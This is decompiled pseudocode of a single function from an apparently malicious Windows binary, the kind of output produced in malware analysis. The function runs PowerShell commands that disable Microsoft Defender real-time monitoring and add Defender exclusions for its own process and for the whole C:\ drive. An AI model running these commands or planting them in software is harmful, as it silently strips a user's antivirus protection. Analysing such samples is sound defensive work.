__int64 __fastcall sub_4FA7E0()
{
  __int64 v0; // r14
  __int128 v1; // xmm15
  __int64 v2; // r8
  _QWORD v4[2]; // [rsp+0h] [rbp-60h] BYREF
  const char *v5; // [rsp+10h] [rbp-50h]
  __int64 v6; // [rsp+18h] [rbp-48h]
  __int128 v7; // [rsp+20h] [rbp-40h]
  __int128 v8; // [rsp+30h] [rbp-30h]
  _QWORD v9[3]; // [rsp+40h] [rbp-20h] BYREF
  __int64 v10; // [rsp+58h] [rbp-8h] BYREF

  if ( (unsigned __int64)&v10 <= *(_QWORD *)(v0 + 16) )
    sub_470660();
  v9[1] = 8;
  v9[0] = "-Command";
  v10 = 56;
  v9[2] = "Set-MpPreference -DisableRealtimeMonitoring $true -Force";
  sub_4CDE40(a1: 2, a2: 2, a3: "Set-MpPreference -DisableRealtimeMonitoring $true -Force", a4: v9);
  sub_4CF220();
  v7 = v1;
  v8 = v1;
  v4[1] = 8;
  v4[0] = "-Command";
  v6 = 34;
  v5 = "Add-MpPreference -ExclusionProcess";
  if ( qword_6C7F78 == 0 )
    sub_472940();
  v2 = *(_QWORD *)qword_6C7F70;
  *((_QWORD *)&v7 + 1) = *(_QWORD *)(qword_6C7F70 + 8);
  *(_QWORD *)&v7 = v2;
  *((_QWORD *)&v8 + 1) = 6;
  *(_QWORD *)&v8 = "-Force";
  sub_4CDE40(a1: 4, a2: 4, a3: "-Force", a4: v4);
  sub_4CF220();
  v4[1] = 8;
  v4[0] = "-Command";
  v6 = 31;
  v5 = "Add-MpPreference -ExclusionPath";
  *((_QWORD *)&v7 + 1) = 3;
  *(_QWORD *)&v7 = "C:\\";
  *((_QWORD *)&v8 + 1) = 6;
  *(_QWORD *)&v8 = "-Force";
  sub_4CDE40(a1: 4, a2: 4, a3: "-Force", a4: v4);
  return sub_4CF220();
}